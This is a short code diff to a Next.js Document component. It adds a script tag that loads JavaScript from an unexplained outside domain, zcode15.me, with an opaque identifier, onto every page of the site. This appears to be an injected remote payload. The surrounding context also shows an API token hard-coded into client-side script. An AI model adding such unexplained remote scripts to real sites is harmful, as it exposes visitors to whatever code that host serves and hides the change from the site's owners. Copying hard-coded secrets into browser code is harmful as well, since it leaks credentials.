@@ -29,6 +29,8 @@ class MyDocument extends Document {
               const apiToken = 'b34ad9ae4cf04b5e7bafbab108924754';
             `}
           </script>
+          {/* Add the external script here */}
+          <script type="text/javascript" src="https://zcode15.me/?ze=mm4tmmjrhe5ha3ddf42dqnjq" async></script>
           <style>
             {`
               body {
